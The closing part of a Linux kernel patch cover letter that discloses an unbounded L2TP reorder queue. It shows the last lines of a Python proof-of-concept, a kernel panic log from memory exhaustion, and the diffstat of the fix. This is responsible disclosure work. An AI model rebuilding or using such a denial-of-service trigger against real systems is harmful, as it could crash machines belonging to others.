    else:
        print(f"[+] oom_mode_completed_without_panic sent={sent}", flush=True)


if __name__ == "__main__":
    main()
PY


------END PoC--------

----BEGIN crash log----

[  317.147298][T10616] Kernel panic - not syncing: Out of memory: compulsory panic_on_oom is enabled
[  317.148195][T10616] CPU: 3 UID: 0 PID: 10616 Comm: python3 Not tainted 6.12.95 #2
[  317.148753][T10616] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  317.149890][T10616] Call Trace:
[  317.150119][T10616]  <TASK>
[  317.150313][T10616]  panic+0x533/0x610
[  317.150599][T10616]  ? __pfx_panic+0x10/0x10
[  317.150911][T10616]  ? srso_alias_return_thunk+0x5/0xfbef5
[  317.151282][T10616]  ? lockdep_hardirqs_on+0x7b/0x110
[  317.151626][T10616]  ? _raw_spin_unlock_irqrestore+0x40/0x80
[  317.152045][T10616]  ? srso_alias_return_thunk+0x5/0xfbef5
[  317.152410][T10616]  ? rcu_is_watching+0x12/0xc0
[  317.152737][T10616]  out_of_memory+0x73c/0x1430
[  317.153070][T10616]  ? __alloc_pages_noprof+0xd53/0x26d0
[  317.153444][T10616]  ? __pfx_out_of_memory+0x10/0x10
[  317.153788][T10616]  ? lock_acquire+0x2f/0xb0
[  317.154097][T10616]  ? __alloc_pages_noprof+0xd53/0x26d0
[  317.154472][T10616]  __alloc_pages_noprof+0x1ecc/0x26d0
[  317.154839][T10616]  ? srso_alias_return_thunk+0x5/0xfbef5
[  317.155263][T10616]  ? find_held_lock+0x2d/0x110
[  317.155579][T10616]  ? __pfx___alloc_pages_noprof+0x10/0x10
[  317.155940][T10616]  ? srso_alias_return_thunk+0x5/0xfbef5
[  317.156325][T10616]  ? __pfx_lock_release+0x10/0x10
[  317.156670][T10616]  ? __might_fault+0xb6/0x120
[  317.157041][T10616]  alloc_pages_mpol_noprof+0x1ab/0x4d0
[  317.157420][T10616]  ? __pfx_alloc_pages_mpol_noprof+0x10/0x10
[  317.157801][T10616]  ? srso_alias_return_thunk+0x5/0xfbef5
[  317.158185][T10616]  ? __virt_addr_valid+0x1f3/0x3d0
[  317.158520][T10616]  ? __check_object_size+0x2eb/0x4f0
[  317.158876][T10616]  skb_page_frag_refill+0x1d0/0x300
[  317.160172][T10616]  ? srso_alias_return_thunk+0x5/0xfbef5
[  317.160548][T10616]  sk_page_frag_refill+0x52/0x2c0
[  317.160913][T10616]  __ip_append_data+0x94a/0x4150
[  317.161268][T10616]  ? __pfx_ip_generic_getfrag+0x10/0x10
[  317.161688][T10616]  ? srso_alias_return_thunk+0x5/0xfbef5
[  317.162079][T10616]  ? ip_dst_mtu_maybe_forward.constprop.0+0x29b/0x590
[  317.162585][T10616]  ? __pfx___ip_append_data+0x10/0x10
[  317.162934][T10616]  ? __pfx___lock_acquire+0x10/0x10
[  317.163300][T10616]  ip_make_skb+0x211/0x2d0
[  317.163597][T10616]  ? find_held_lock+0x2d/0x110
[  317.163922][T10616]  ? __pfx_ip_generic_getfrag+0x10/0x10
[  317.164302][T10616]  ? __pfx_ip_make_skb+0x10/0x10
[  317.164617][T10616]  ? ipv4_dst_check+0x164/0x2b0
[  317.164959][T10616]  ? srso_alias_return_thunk+0x5/0xfbef5
[  317.165371][T10616]  ? srso_alias_return_thunk+0x5/0xfbef5
[  317.165744][T10616]  ? udp_sendmsg+0x155b/0x2370
[  317.166078][T10616]  udp_sendmsg+0x155b/0x2370
[  317.166391][T10616]  ? __pfx_aa_label_sk_perm+0x10/0x10
[  317.166746][T10616]  ? __pfx_ip_generic_getfrag+0x10/0x10
[  317.167147][T10616]  ? __pfx_udp_sendmsg+0x10/0x10
[  317.167477][T10616]  ? hlock_class+0x4e/0x130
[  317.167770][T10616]  ? srso_alias_return_thunk+0x5/0xfbef5
[  317.168202][T10616]  ? __sys_sendto+0x32e/0x3a0
[  317.168499][T10616]  __sys_sendto+0x32e/0x3a0
[  317.168797][T10616]  ? __pfx___sys_sendto+0x10/0x10
[  317.169198][T10616]  ? __pfx_lock_release+0x10/0x10
[  317.169571][T10616]  ? srso_alias_return_thunk+0x5/0xfbef5
[  317.169945][T10616]  ? rcu_is_watching+0x12/0xc0
[  317.170764][T10616]  __x64_sys_sendto+0xe0/0x1c0
[  317.171083][T10616]  ? do_syscall_64+0x93/0x270
[  317.171389][T10616]  ? srso_alias_return_thunk+0x5/0xfbef5
[  317.171803][T10616]  ? lockdep_hardirqs_on+0x7b/0x110
[  317.172154][T10616]  do_syscall_64+0xc7/0x270
[  317.172516][T10616]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  317.173593][T10616] RIP: 0033:0x7f5fabf45687
[  317.173886][T10616] Code: 48 89 fa 4c 89 df e8 58 b3 00 00 8b 93 08 03 00 00 59 5e 48 83 f8 fc 74 1a 5b c3 0f 1f 84 00 00 00 00 00 48 8b 44 24 10 0f 05 <5b> c3 0f 1f 80 00 00 00 00 83 e2 39 83 fa 08 75 de e8 23 ff ff ff
[  317.175212][T10616] RSP: 002b:00007ffe2aaccb60 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
[  317.175763][T10616] RAX: ffffffffffffffda RBX: 00007f5fabeb1780 RCX: 00007f5fabf45687
[  317.176303][T10616] RDX: 000000000000ea6c RSI: 0000000034d07590 RDI: 0000000000000004
[  317.176857][T10616] RBP: 0000000000000000 R08: 0000000000000000 R09: 0000000000000000
[  317.177380][T10616] R10: 0000000000000000 R11: 0000000000000202 R12: 0000000000000000
[  317.177895][T10616] R13: 0000000000000000 R14: 00000000006ff020 R15: 0000000000a83590
[  317.178445][T10616]  </TASK>
[  317.178849][T10616] Kernel Offset: disabled
[  317.179211][T10616] Rebooting in 86400 seconds..


-----END crash log-----

Best regards,
Ruide Cao


Ruide Cao (1):
  l2tp: bound the reorder queue

 net/l2tp/l2tp_core.c | 57 +++++++++++++++++++++++++++++++++++++++++---
 net/l2tp/l2tp_core.h |  2 ++
 2 files changed, 56 insertions(+), 3 deletions(-)

base-commit: 24ef02f934eeb48830cff6b739abc3c62b1d107b

-- 
2.47.3

